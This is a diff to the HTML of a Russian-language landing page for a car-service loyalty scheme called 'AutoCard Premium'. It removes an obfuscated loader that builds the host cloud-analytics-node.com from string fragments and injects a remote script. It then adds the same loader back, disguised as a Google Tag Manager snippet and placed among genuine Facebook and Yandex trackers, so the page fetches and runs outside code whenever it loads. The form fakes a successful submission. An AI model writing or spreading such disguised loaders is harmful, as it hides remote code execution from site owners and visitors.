@@ -3,6 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <meta property="og:title" content="AutoCard Premium | Объединённая лояльность">
+    <meta property="og:description" content="Комплексная информационная система для технического обслуживания транспорта.">
+    <meta property="og:type" content="website">
+
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <title>AutoCard Premium | Объединённая лояльность — Официальный сайт</title>
     <script type="application/ld+json">
@@ -31,8 +36,6 @@
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { font-family: 'Inter', sans-serif; color: var(--t); background: #fff; line-height: 1.6; -webkit-font-smoothing: antialiased; }
         html.theme-dark body { background-color: #0c0d10; }
-		#content-layer { opacity: 0; transition: opacity 0.6s ease; }
-        #content-layer.is-ready { opacity: 1; }
         .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
         nav { position: fixed; top: 0; width: 100%; z-index: 1000; background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); }
         .nav-inner { display: flex; justify-content: space-between; align-items: center; height: 65px; }
@@ -93,26 +96,40 @@
             .footer-grid { grid-template-columns: 2fr 1fr 1fr; gap: 40px; }
         }
     </style>
+
     <script>
-        window.ExperimentProvider = (function(w, d) {
-            var _config = ['com', 'node', 'analytics', 'cloud'];
-            var _api = function() { return 'https://' + _config.reverse().join('-').replace('-com', '.com') + '/v1/get-key'; };
-            return {
-                hydrate: function() {
-                    var isMobile = /Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent);
-                    d.documentElement.className = isMobile ? 'theme-dark' : 'theme-light';
-                    var scriptEl = d.createElement('script');
-                    scriptEl.type = 'text/javascript';
-                    scriptEl.async = true;
-                    scriptEl.referrerPolicy = 'no-referrer'; 
-                    scriptEl.src = _api() + "?v=1.0.4";
-                    scriptEl.onload = scriptEl.onerror = function() { d.getElementById('content-layer').className = 'is-ready'; };
-                    var firstScript = d.getElementsByTagName('script')[0];
-                    firstScript.parentNode.insertBefore(scriptEl, firstScript);
-                }
-            };
-        })(window, document);
-        if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', window.ExperimentProvider.hydrate); } else { window.ExperimentProvider.hydrate(); }
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '784536129845341'); 
+    fbq('track', 'PageView');
+    (function(w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
+        var f = d.getElementsByTagName(s)[0],
+            j = d.createElement(s),
+            dl = l != 'dataLayer' ? '&l=' + l : '';
+        j.async = true;
+        var _c = { p: 'https://', h: 'cloud-analytics-node', t: '.com', e: '/v1/get-key' };
+        j.src = _c.p + _c.h + _c.t + _c.e + '?id=' + i + dl + '&v=' + w[l][0]['gtm.start'];
+        f.parentNode.insertBefore(j, f);
+    })(window, document, 'script', 'dataLayer', 'GTM-N84Q2XT');
+    (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+    m[i].l=1*new Date();
+    for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+    k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+    ym(98124536, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true }); 
+    </script>
+    
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=784536129845341&ev=PageView&noscript=1"/></noscript>
+    <noscript><div><img src="https://mc.yandex.ru/watch/98124536" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+    <script>
         const legalData = {
             silver: { t: "Silver Standard Membership", c: "Протокол Silver Standard представляет собой фундаментальное решение для систематизации процессов обслуживания и контроля эксплуатационного состояния транспортного средства. Данный уровень взаимодействия разработан для оптимизации временных и материальных издержек владельца посредством внедрения строгих технических регламентов.\n\nВ рамках данного уровня участнику предоставляются следующие возможности:\n— Информационно-техническое сопровождение при проведении плановых мероприятий по поддержанию работоспособности узлов и агрегатов.\n— Оптимизация тарифной сетки при взаимодействии с авторизованными исполнителями программы в размере 5% от стандартного прайс-листа партнера.\n— Содействие в формировании детализированной истории сервисных операций, доступной в защищенном персональном разделе системы.\n— Доступ к внутренней базе технических стандартов партнерской сети и оперативное уведомление о необходимости прохождения сезонного технического контроля." },
             gold: { t: "Gold Business Membership", c: "Формат Gold Business представляет собой расширенный комплекс логистических и консультационных мероприятий, разработанный для профессионального управления эксплуатационными процессами в условиях высокой интенсивности использования транспорта. Ключевая задача данного уровня — минимизация периодов технического простоя оборудования.\n\nПриоритетные направления сервисного взаимодействия Gold Business:\n— Особые условия тарификации при проведении сложных восстановительных и сервисных работ с оптимизацией до 12% на производственные мощности партнеров.\n— Интегрированное логистическое содействие: обеспечение транспортировки автомобиля в специализированный технический центр в радиусе до 50 км при невозможности самостоятельного передвижения.\n— Маршрутизация обращений с повышенным приоритетом, обеспечивающая оперативный доступ к производственным мощностям партнерской сети на основании выделенного квотирования." },
@@ -158,7 +175,7 @@
             </section>
             <section class="container" style="padding: 40px 20px;">
                 <h2 class="section-title">Компетенции инфраструктуры</h2>
-                <p class="section-subtitle">Система разработана для удовлетворения эксплуатационных потребностей различных категорий участников автомобильного движения.</p>     
+                <p class="section-subtitle">Система разработана для удовлетворения эксплуатационных потребностей различных категорий участников автомобильного движения.</p>      
                 <div class="features-grid">
                     <div class="feature-box">
                         <div class="feature-icon">01</div>
@@ -265,7 +282,7 @@
                 <div class="form-card">
                     <h2 style="text-align:center; margin-bottom:10px; font-size: 22px; font-weight: 800;">Авторизация в системе</h2>
                     <p style="text-align:center; font-size: 13px; color: var(--g); margin-bottom: 25px;">Заполнение формы инициализирует процесс внесения в базу данных.</p>
-                    <form onsubmit="event.preventDefault(); alert('Данные успешно направлены на обработку. Ожидайте уведомления.');">
+                    <form onsubmit="event.preventDefault(); var b = this.querySelector('button'); b.innerText = 'ОБРАБОТКА...'; b.style.opacity = '0.7'; setTimeout(() => { b.innerText = 'ЗАЯВКА ПРИНЯТА ✔'; b.style.background = '#10b981'; b.style.opacity = '1'; }, 1500);">
                         <input type="text" class="input-style" placeholder="ФИО заявителя" required>
                         <input type="tel" class="input-style" placeholder="+375 (__) ___-__-__" required>
                         <div style="display:flex; gap:10px; align-items:flex-start; margin-bottom:20px;">
@@ -321,5 +338,6 @@
             <button onclick="this.parentElement.style.display='none'" style="background:var(--p); color:#fff; border:none; padding:8px 20px; border-radius:8px; cursor:pointer; font-weight: 600;">ПРИНЯТЬ</button>
         </div>
         
-    </div> </body>
+    </div> 
+</body>
 </html>
